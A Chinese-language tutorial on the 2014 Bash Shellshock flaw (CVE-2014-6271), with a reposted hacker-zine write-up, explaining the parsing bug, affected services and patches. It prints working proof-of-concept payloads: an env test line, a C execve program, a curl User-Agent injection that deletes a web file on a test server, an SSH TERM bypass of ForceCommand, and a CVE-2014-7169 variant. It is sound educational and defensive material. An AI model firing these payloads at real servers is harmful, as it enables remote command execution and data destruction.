新手对Bash环境变量解析漏洞的理解
[日期：2014-10-13] 	来源：Linux社区  作者：smstong 	[字体：大 中 小]

1 环境变量是什么
无论是Windows程序还是Linux程序，都支持环境变量，一般来讲环境变量作为赋值字符串的形式存放到进程内存空间的开头部分。用户在执行一个程序时，可以通过指定环境变量来给被执行的程序传递信息。在GUI占主导的Windows平台上，一般用户很少需要使用环境变量来为程序传递信息。环境变量是进程空间的资源，不同进程的环境变量不能共享。但是可以通过进程资源继承机制来把父进程的环境变量复制一份到子进程中。例如，为bash进程设置的环境变量，会自动复制一份到通过bash启动的子进程中。

不同的程序对环境变量的应用程度也不相同，很多小程序可以都对环境变量不予理会。然而也有很多程序严重依赖于环境变量，如用于Web的CGI程序，其所有的表单数据都是通过环境变量的形式由web服务器进程传递给CGI程序的。下面是一个用C语言写的简单的CGI程序。

int main(void)
{
    char *data;
    long m,n;
    printf("%s%c%c ","Content-Type:text/html;charset=gb2312",13,10);
    printf("< TITLE >乘法结果< /TITLE > ");
    printf("< H3 >乘法结果< /H3 > ");
    data = getenv("QUERY_STRING");
    if(data == NULL)
        printf("< P >错误！数据没有被输入或者数据传输有问题");
    else if(sscanf(data,"m=%ld&n=%ld",&m,&n)!=2)
        printf("< P >错误！输入数据非法。表单中输入的必须是数字。");
    else
        printf("< P >%ld和%ld的成绩是：%ld。",m,n,m*n);
    return 0;
}
可以看出，客户端发来的GET请求字符串是通过环境变量QUERY_STRING传递给这个程序的。

Bash也是一个环境变量重度用户，当然使用bash编写的CGI程序就更加依赖于环境变量了。下面是用bash写的CGI程序。

#!/bin/bash 
 
echo 'Content-type: test/html' 
echo '' 
echo $QUERY_STRING 

同样也是使用了环境变量QUERY_STRING.

Gitlab-shell 受 Bash CVE-2014-6271 漏洞影响  http://www.linuxidc.com/Linux/2014-09/107181.htm

Linux再曝安全漏洞Bash 比心脏出血还严重 http://www.linuxidc.com/Linux/2014-09/107176.htm

解决办法是升级 Bash，请参考这篇文章。http://www.linuxidc.com/Linux/2014-09/107182.htm

Bash远程解析命令执行漏洞测试方法 http://www.linuxidc.com/Linux/2014-09/107289.htm

Bash漏洞最新补丁安装教程【附下载】  http://www.linuxidc.com/Linux/2014-10/107851.htm

破壳漏洞(Shellshock)修复详解 http://www.linuxidc.com/Linux/2014-10/107925.htm

2 bash 分析环境变量存在的漏洞分析
 

前面说过，环境变量就是一组特殊的字符串，利用环境变量的程序必须要对其进行分析处理。对字符串的处理是大部分程序中很重要的任务，对于Web程序而已更甚(html，xml, json文件内容本身就是字符串)。

bash当然也不例外，它需要分析环境变量字符串，然后解释其意义并执行相关操作。由于bash脚本本身就是文本字符串，所以bash引擎可以简单把环境变量字符串转变为脚本格式的字符串，然后拿出来与要执行的bash脚本合并，然后再解释执行合并后的脚本。

例如如下脚本:

echo 环境变量X的值是$X
环境变量为X=100，那么合并后相当于:

X=100
echo 环境变量X的值为$X
我们可以通过env这个工具来试试效果，env 的作用就是为即将执行的程序指定环境变量。

[root@localhost ~]# env X=100 bash -c 'echo 环境变量X的值为$X';
环境变量X的值为100
再来构造一个特殊点的环境变量。

[root@localhost ~]# env X='() { echo 我是环境变量;};'  bash -c 'env';
HOSTNAME=localhost.localdomain
.... 省略显示无关环境变量
SSH_CONNECTION=172.16.35.220 60128 172.16.35.135 22
LESSOPEN=|/usr/bin/lesspipe.sh %s
G_BROKEN_FILENAMES=1
X=() {  echo 我是环境变量
}
此时，环境变量X还是一个字符串而已，但是bash把他解释为了一个函数类型而不是一个字符串类型的值。所以可以直接执行这个函数了。如下：

[root@localhost ~]# env X='() { echo 我是环境变量;};'  bash -c 'X';
我是环境变量
此时，bash解释环境变量后转换成的脚本为：

X() { echo 我是环境变量;};
而不是原样照搬为X=(){ echo 我是环境变量;};

可见对于不同的字符串格式的环境变量值，bash有不同的解释方式。

继续让这个X的值更复杂一点，如下：

[root@localhost ~]# env X='() { echo 我是环境变量;}; echo 你中招了'  bash -c 'env'
你中招了
HOSTNAME=localhost.localdomain
SHELL=/bin/bash
SSH_CONNECTION=172.16.35.220 60128 172.16.35.135 22
LESSOPEN=|/usr/bin/lesspipe.sh %s
G_BROKEN_FILENAMES=1
X=() {  echo 我是环境变量
}
_=/bin/env
问题出现了！此时env为bash设置的环境变量X的值为

 () { echo 我是环境变量;}; echo 你中招了
bash把前半部分解释成了函数X的函数体，而把后半部分啥也没做，直接原样转为脚本。解释后的脚本如下：

 X() { echo 我是环境变量;};
 echo 你中招了
合并后的脚本如下：

X() { echo 我是环境变量;};
echo 你中招了
env
这样就会直接执行 echo 你中招了 ，而其实这个命令可以换成任意其他命令，也就达到让bash执行任意命令的目的了。这就是此次bash漏洞的基本原理。

再来看看打完补丁后的效果。

[root@localhost ~]# env X='() { echo 我是环境变量;}; echo 你中招了'  bash -c 'env'
HOSTNAME=localhost.localdomain
SHELL=/bin/bash
X=() { echo 我是环境变量;}; echo 你中招了
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin
_=/bin/env

[root@localhost ~]# env X='() { echo 我是环境变量;}; echo 你中招了'  bash -c 'echo $X'
() { echo 我是环境变量;}; echo 你中招了
可以看出此时，bash不再把X当成函数来解释，而是把整个环境变量的值都全部作为纯字符串赋予了X。

3 谁会受到bash漏洞的影响？
通过上面的原理分析我们知道，只要是能通过某种手段为bash传递环境变量的程序都受此影响。当然最典型的的就是bash写的CGI程序了，客户端通过在请求字符串里加入值为 () { echo 我是环境变量;}; echo 你中招了的表单值，就可以轻松攻击运行CGI的服务器。

目前大多数的一般网站很少用CGI了，所以问题不算太大。但是有很多的网络设备，如路由器交换机等都使用了perl或者其他语言写的CGI程序，只要是底层调用了bash，那么风险还是很大的。

目前，针对此漏洞的补丁已经发布，请尽快打上。不幸的是打上补丁后仍存在另外的泄露文件内容的漏洞，详情参看如下转载文章：https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt

[sth0r@shawn-fortress]$ uname -a
Linux shawn-fortress 3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux

|=-----------------------------------------------------------------=|
|=-----=[ D O  N O T  F U C K  W I T H  A  H A C K E R ]=-----=|
|=-----------------------------------------------------------------=|
|=------------------------[ #4 File 0x07 ]-------------------------=|
|=-----------------------------------------------------------------=|
|=-------------------=[ Bash Shellshock事件: ]=--------------------=|
|=-------------------=[ CVE-2014-6271资料汇总]=--------------------=|
|=-----------------------------------------------------------------=|
|=---------------------=[ By Shawn the R0ck ]=---------------------=|
|=-----------------------------------------------------------------=|
|=-----------------------=[ Sep 25 2014  ]=------------------------=|
|=-----------------------------------------------------------------=|

--[ Content

0. What is BASH

1. CVE-2014-6271

2. Incomplete patch and story to be continued...

 

--[ 0. 什么是BASH

Bourne Again Shell(简称BASH）是在GNU/Linux上最流行的SHELL实现，于1980年
诞生，经过了几十年的进化从一个简单的终端命令行解释器演变成了和GNU系统深
度整合的多功能接口。


--[ 1. CVE-2014-6271

法国GNU/Linux爱好者Stéphane Chazelas于2014年9月中旬发现了著名SHELL实现
BASH的一个漏洞，你可以通过构造环境变量的值来执行你想要执行的脚本代码，
据报道称，这个漏洞能影响众多的运行在GNU/Linux上的会跟BASH交互的应用程序，
包括:

** 在sshd配置中使用了ForceCommand用以限制远程用户执行命令，这个漏洞可以
  绕过限制去执行任何命令。一些Git和Subversion部署环境的限制Shell也会出
  现类似情况，OpenSSH通常用法没有问题。

** Apache服务器使用mod_cgi或者mod_cgid，如果CGI脚本在BASH或者运行在子
  SHELL里都会受影响。子Shell中使用C的system/popen，Python中使用
  os.system/os.popen，PHP中使用system/exec(CGI模式)和Perl中使用
  open/system的情况都会受此漏洞影响。

** PHP脚本执行在mod_php不会受影响。

** DHCP客户端调用shell脚本接收远程恶意服务器的环境变量参数值的情况会被
  此漏洞利用。

** 守护进程和SUID程序在环境变量设置的环境下执行SHELL脚本也可能受到影响。

** 任何其他程序执行SHELL脚本时用BASH作为解释器都可能受影响。Shell脚本不
  导出的情况下不会受影响。


我们先来看一个简单的POC：

1，本地SHELL环境中测试是否有漏洞：
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

如果存在漏洞会打印"vulnerable"。


2，C程序：
-----------------------------------------------------------------------------
/* CVE-2014-6271 + aliases with slashes PoC - je [at] clevcode [dot] org */
#include <unistd.h>
#include <stdio.h>
 
int main()
{
    char *envp[] = {
        "PATH=/bin:/usr/bin",
        "/usr/bin/id=() { "
        "echo pwn me twice, shame on me; }; "
        "echo pwn me once, shame on you",
        NULL
    };
    char *argv[] = { "/bin/bash", NULL };
 
    execve(argv[0], argv, envp);
    perror("execve");
    return 1;
}

je@tiny:~$ gcc -o bash-is-fun bash-is-fun.c
je@tiny:~$ ./bash-is-fun
pwn me once, shame on you
je@tiny:/home/je$ /usr/bin/id
pwn me twice, shame on me
--------------------------------------------------------------

这个POC中可以看出BASH根本就没有去处理结尾，后面我们可以通过补丁来看为什么。


3，INVISIBLETHREAT上对于HTTP环境的测试：

创建一个脚本叫poc.cgi:

#!/bin/bash
 
echo "Content-type: text/html"
echo ""
 
echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>PoC</title>'
echo '</head>'
echo '<body>'
echo '<pre>'
/usr/bin/env
echo '</pre>'
echo '</body>'
echo '</html>'
 
exit 0

把脚本放入测试机后，输入：
$ curl http://192.168.0.1/poc.cgi
 
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PoC</title>
</head>
<body>
<pre>
SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>
 
HTTP_USER_AGENT=curl/7.26.0
SERVER_PORT=80
HTTP_HOST=192.168.0.1
DOCUMENT_ROOT=/var/www
SCRIPT_FILENAME=/var/www/poc.cgi
REQUEST_URI=/poc.cgi
SCRIPT_NAME=/poc.cgi
REMOTE_PORT=40974
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/var/www
SERVER_ADMIN=webmaster@localhost
HTTP_ACCEPT=*/*
REMOTE_ADDR=192.168.0.1
SHLVL=1
SERVER_NAME=192.168.0.1
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=192.168.0.1
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
_=/usr/bin/env
</pre>
</body>
</html>

再来试试使用curl设置一个user-agent玩玩：

$ curl -A "() { :; }; /bin/rm /var/www/target" http://192.168.0.1/poc.cgi
 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
webmaster@localhost and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>
</body></html>

上面已经把/var/www/target给删除了，再来看看：
 
$ curl http://192.168.0.1/target
 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /target was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80</address>
</body></html>


4, 针对OpenSSH的POC，目前有2个攻击平面，Solar Designer给出了
SSH_ORIGINAL_COMMAND的本地利用方法：

seclists.org/oss-sec/2014/q3/651

还有就是针对远程利用的POC，通过利用TERM：

在机器A上生成一对RSA key pair:
shawn@debian-test32:~/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/shawn/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/shawn/.ssh/id_rsa.
Your public key has been saved in /home/shawn/.ssh/id_rsa.pub.
The key fingerprint is:
09:1c:92:fb:c5:68:f8:e1:b9:c2:62:a8:c7:75:5b:dc shawn@debian-test32
The key's randomart image is:
+--[ RSA 2048]----+
|    ...          |
|    .o .        |
|    ooo        |
|    o +.o.      |
|    = =S.      |
|    . * o E      |
| o o . +        |
|. = o o          |
|oo . .          |
+-----------------+


把A的公钥拷贝到机器B上：
$cat /home/shawn/.ssh/authorized_keys
command="/tmp/ssh.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9xYHEdjbbvSO+RAtDS3u+R4sD87SUQq5OZJ+6P5n3BoOz8eKfmK2B4qQa28uGvpseFSSXIoXTKdeS3mCXevbibGG6E3RQ63U7USrh9iQupO6c45Qt+3/WOo7X3mRlZ1awUmCjurcA5Zm/yOvyMJCoRd1kpkiJljgHtMztEhWvAE4inFkqyWC81SSfsvNd/GEiyCpFw84UTdF/cH626V3V73hlxwBMd8UKI27I7ATMOcPgWsI5738tLpgPDSisvZZXZNlxAfvSgpxKYAHOQ9VsaJCG4q+Giob5iX4IDzn8gs8G7uGW+EGhzTMq83f/8ar5a5Ex8Dg9M/loYPIPp5gJ shawn@debian-test32


一个用于控制command/SSH_ORIGINAL_COMMAND的脚本
shawn@linux-ionf:~/.ssh> cat /tmp/ssh.sh
#!/bin/sh

case "$SSH_ORIGINAL_COMMAND" in
 "ps")
  ps -ef
  ;;
 "vmstat")
  vmstat 1 100
  ;;
 "cups stop")
  /etc/init.d/cupsys stop
  ;;
 "cups start")
  /etc/init.d/cupsys start
  ;;
 *)
  echo "Sorry. Only these commands are available to you:"
  echo "ps, vmstat, cupsys stop, cupsys start"
  #exit 1
  ;;
esac


机器A上可以正常的使用限制脚本:
shawn@debian-test32:~/.ssh$ export SSH_ORIGINAL_COMMAND="ps"
shawn@debian-test32:~/.ssh$ ssh  shawn@192.168.115.129 $SSH_ORIGINAL_COMMAND
Enter passphrase for key '/home/shawn/.ssh/id_rsa':
UID        PID  PPID  C STIME TTY          TIME CMD
root        1    0  0 16:47 ?        00:00:02 /sbin/init showopts
root        2    0  0 16:47 ?        00:00:00 [kthreadd]
root        3    2  0 16:47 ?        00:00:00 [ksoftirqd/0]


借助TERM来利用：
shawn@debian-test32:~$ export TERM='() { :;}; id'; ssh  shawn@192.168.115.129
Enter passphrase for key '/home/shawn/.ssh/id_rsa':
uid=1000(shawn) gid=100(users) groups=100(users)
Connection to 192.168.115.129 closed.


--[ 2. 补丁和后续

从最早GNU/Linux发行版社区收到的补丁：

https://bugzilla.novell.com/attachment.cgi?id=606672

可以看出BASH的确没有做异常处理，而直接解析后就执行了。

正式的社区补丁在这里：

http://ftp.gnu.org/pub/gnu/bash/bash-3.0-patches/bash30-017
http://ftp.gnu.org/pub/gnu/bash/bash-3.1-patches/bash31-018
http://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-052
http://ftp.gnu.org/pub/gnu/bash/bash-4.0-patches/bash40-039
http://ftp.gnu.org/pub/gnu/bash/bash-4.1-patches/bash41-012
http://ftp.gnu.org/pub/gnu/bash/bash-4.2-patches/bash42-048
http://ftp.gnu.org/pub/gnu/bash/bash-4.3-patches/bash43-025

但由于补丁修复的不完整，导致了CVE-2014-7169的爆出,POC如下：

shawn@shawn-fortress /tmp $ date -u > test_file
shawn@shawn-fortress /tmp $ env X='() { (a)=<\' bash -c 'test_file cat'
bash: X: line 1: syntax error near unexpected token `='
bash: X: line 1: `'
bash: error importing function definition for `X'
Thu Sep 25 09:37:04 UTC 2014

这个POC可以让攻击者能读文件，看来后续的故事还没结束...................

[1] BASH
http://www.gnu.org/software/bash/

[2] Bash specially-crafted environment variables code injection attack
https://securityblog.RedHat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/

[3] CVE-2014-6271
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271

[4] CVE-2014-7169
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169

[4] CVE-2014-6271: remote code execution through bash
http://seclists.org/oss-sec/2014/q3/651

本文永久更新链接地址：http://www.linuxidc.com/Linux/2014-10/107984.htm
linux